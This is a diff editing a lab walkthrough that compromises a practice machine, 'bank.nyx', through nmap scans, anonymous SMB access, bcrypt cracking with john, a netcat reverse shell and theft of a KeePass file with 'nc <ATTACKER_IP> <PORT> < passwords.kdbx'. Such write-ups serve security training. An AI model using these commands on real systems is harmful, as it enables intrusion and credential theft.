@@ -19,7 +19,7 @@ An SMB share leaks the path to a hidden development instance of a banking web ap
 A full TCP port scan is run first:
 
 ```bash
-sudo nmap -p- -sS --open -n -vvv -Pn bank.nyx
+$ sudo nmap -p- -sS --open -n -vvv -Pn bank.nyx
 
 PORT    STATE SERVICE      REASON
 80/tcp  open  http         syn-ack ttl 64
@@ -31,7 +31,7 @@ MAC Address: 08:00:27:C2:B4:77 (Oracle VirtualBox virtual NIC)
 A version/script scan against the open ports fills in the details:
 
 ```bash
-sudo nmap -p 80,139,445 -sCV bank.nyx
+$ sudo nmap -p 80,139,445 -sCV bank.nyx
 
 PORT    STATE SERVICE     VERSION
 80/tcp  open  http        Apache httpd 2.4.66
@@ -42,11 +42,11 @@ PORT    STATE SERVICE     VERSION
 MAC Address: 08:00:27:C2:B4:77 (Oracle VirtualBox virtual NIC)
 
 Host script results:
-| smb2-security-mode: 
-|   3.1.1: 
+| smb2-security-mode:
+|   3.1.1:
 |_    Message signing enabled but not required
 |_nbstat: NetBIOS name: BANK, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
-| smb2-time: 
+| smb2-time:
 |   date: 2026-07-22T10:23:36
 |_  start_date: N/A
 ```
@@ -67,36 +67,25 @@ http://bank.nyx/
 A quick look at what's shared over SMB:
 
 ```bash
-smbmap -H bank.nyx                         
+$ smbmap -H bank.nyx
 
-    ________  ___      ___  _______   ___      ___       __         _______
-   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
-  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
-   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
-    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
-   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
-  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
------------------------------------------------------------------------------
-SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
-                     https://github.com/ShawnDEvans/smbmap
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB connections(s) and 0 authenticated session(s)
 
-[*] Detected 1 hosts serving SMB                                                                                                  
-[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
-                                                                                                                             
-[+] IP: 10.0.2.51:445   Name: bank.nyx                  Status: NULL Session
+[+] IP: bank.nyx:445   Name: bank.nyx                  Status: NULL Session
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
         development                                             READ ONLY
         print$                                                  NO ACCESS       Printer Drivers
         IPC$                                                    NO ACCESS       IPC Service (Samba 4.22.8-Debian-4.22.8+dfsg-0+deb13u1)
         nobody                                                  NO ACCESS       Home Directories
-[*] Closed 1 connections 
+[*] Closed 1 connections
 ```
 
 A `development` share stands out. It's accessible without credentials:
 
 ```bash
-smbclient -N //bank.nyx/development
+$ smbclient -N //bank.nyx/development
 Anonymous login successful
 Try "help" to get a list of possible commands.
 smb: \> dir
@@ -105,24 +94,24 @@ smb: \> dir
   03-may-26.txt                       N     1141  Sun May  3 06:43:20 2026
 
                 9627844 blocks of size 1024. 6282348 blocks available
-smb: \> get 03-may-26.txt 
+smb: \> get 03-may-26.txt
 getting file \03-may-26.txt of size 1141 as 03-may-26.txt (159.2 KiloBytes/sec) (average 159.2 KiloBytes/sec)
 ```
 
 ```bash
-cat 03-may-26.txt 
+$ cat 03-may-26.txt
 Subject: AI Agent Integration & Development Environment Setup
 
-To streamline and accelerate the development of the banking platform, we have decided to integrate a subscription-based AI agent into our workflow. 
-The service has proven to be cost-effective; however, please be aware that the AI may occasionally produce incorrect or unexpected outputs. 
+To streamline and accelerate the development of the banking platform, we have decided to integrate a subscription-based AI agent into our workflow.
+The service has proven to be cost-effective; however, please be aware that the AI may occasionally produce incorrect or unexpected outputs.
 For this reason, it is important to maintain strict attention to security and validate all critical operations.
 
 A dedicated development directory has been enabled where developers can access and test the application.
 Dir: development-0119-d5e051a-9da2-12sdas1-775-e0174
 
-Additionally, the system administrator user called Juan, hired by Lucas in recent days, is currently on a probationary training period within the company. 
-He will be responsible for completing the configuration of the SMB service. While the service is already installed, some final setup steps are 
-still pending. Please note that he is still gaining experience, so we kindly ask for patience and encourage collaboration and assistance if needed 
+Additionally, the system administrator user called Juan, hired by Lucas in recent days, is currently on a probationary training period within the company.
+He will be responsible for completing the configuration of the SMB service. While the service is already installed, some final setup steps are
+still pending. Please note that he is still gaining experience, so we kindly ask for patience and encourage collaboration and assistance if needed
 to ensure everything is properly configured.
 
 Best regards,
@@ -152,7 +141,7 @@ http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/index.php?page=d
 
 <img src="../Images/bank/Pasted image 20260522165459.png"/>
 
-An `admin` account is visible from the dashboard.
+The dashboard exposes a user enumeration issue — usernames of other accounts are visible directly through its functionality, without needing to guess them. Among them, an `admin` account stands out as the natural target for privilege escalation.
 
 ## Initial Access
 
@@ -195,16 +184,16 @@ Instead of returning a simple "recipient exists" flag, the endpoint embeds the r
 The hash is bcrypt, identifiable by the `$2y$` prefix, and gets run against `rockyou.txt`:
 
 ```bash
-john password_admin.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
+$ john password_admin.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
 Using default input encoding: UTF-8
 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
 Cost 1 (iteration count) is 4096 for all loaded hashes
 Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-blink182         (?)     
+blink182         (?)
 1g 0:00:00:10 DONE (2026-07-22 06:36) 0.09487g/s 17.07p/s 17.07c/s 17.07C/s peanut..kisses
 Use the "--show" option to display all of the cracked passwords reliably
-Session completed. 
+Session completed.
 ```
 
 > **Admin password:** `blink182`
@@ -288,9 +277,9 @@ http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/uploads/
 A listener is set up, and the uploaded file is requested to trigger the callback:
 
 ```bash
-nc -nlvp 9001
-listening on [any] 9001 ...
-connect to [10.0.2.15] from (UNKNOWN) [10.0.2.8] 34200
+$ nc -nlvp <PORT>
+listening on [any] <PORT> ...
+connect to [<ATTACKER_IP>] from (UNKNOWN) [bank.nyx] 34200
 Linux bank 6.12.85+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.85-1 (2026-04-30) x86_64 GNU/Linux
  17:01:34 up 34 min,  0 users,  load average: 0.00, 0.04, 0.06
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
@@ -338,20 +327,20 @@ www-data@bank:/$ cd /srv/smb/passwords/
 
 > **Password:** `@zm{2h8aUu'a_M;'Jd:!MAQ?zn`
 
-Along with (or near) that note, a KeePass database file (`passwords.kdbx`) is found on the box and exfiltrated over a raw `nc` transfer — one side listens and redirects the incoming stream to a file, the other sends the file into a connection to that listener:
+Along with (or near) that note, a KeePass database file (`passwords.kdbx`) is found on the box and exfiltrated over a raw `nc` transfer — one side listens on the attacker's machine and redirects the incoming stream to a file, the other sends the file into a connection to that listener:
 
 ```bash
 # Attacker Machine
-nc -lvp 9002 > passwords.kdbx
+$ nc -lvp <PORT> > passwords.kdbx
 
 # Victim Machine
-nc 10.0.2.8 9002 < passwords.kdbx
+nc <ATTACKER_IP> <PORT> < passwords.kdbx
 ```
 
 With the database local, `keepassxc` opens it using the password recovered from `note.txt` as the master password:
 
 ```bash
-keepassxc
+$ keepassxc
 ```
 <img src="../Images/bank/Pasted image 20260522164856.png"/>
 
